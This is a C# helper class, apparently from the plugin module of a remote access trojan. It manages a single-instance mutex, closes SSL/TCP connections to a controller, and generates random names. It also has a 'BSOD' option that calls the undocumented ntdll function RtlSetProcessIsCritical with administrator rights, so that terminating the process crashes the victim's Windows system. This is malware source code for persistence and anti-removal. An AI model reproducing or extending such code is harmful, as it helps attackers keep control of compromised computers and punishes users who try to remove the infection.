using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Plugin
{
    public static class Methods
    {
        private const string Alphabet = "abcdefghijklmnopqrstuvwxyz";

        public static Random Random = new Random();

        public static string GetRandomString(int length)
        {
            var randomName = new StringBuilder(length);
            for (var i = 0; i < length; i++)
                randomName.Append(Alphabet[Random.Next(Alphabet.Length)]);

            return randomName.ToString();
        }

        public static void ClientExit()
        {
            try
            {
                if (Convert.ToBoolean(Plugin.BSOD) && IsAdmin())
                    ProcessCriticalExit();
                CloseMutex();
                Connection.SslClient?.Close();
                Connection.TcpClient?.Close();
            }
            catch
            {
            }
        }

        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void CloseMutex()
        {
            if (Plugin.AppMutex != null)
            {
                Plugin.AppMutex.Close();
                Plugin.AppMutex = null;
            }
        }

        public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            if (Convert.ToBoolean(Plugin.BSOD) && IsAdmin())
                ProcessCriticalExit();
        }

        public static void ProcessCriticalExit()
        {
            try
            {
                RtlSetProcessIsCritical(0, 0, 0);
            }
            catch
            {
                while (true) Thread.Sleep(100000); //prevents a BSOD on exit failure
            }
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
    }
}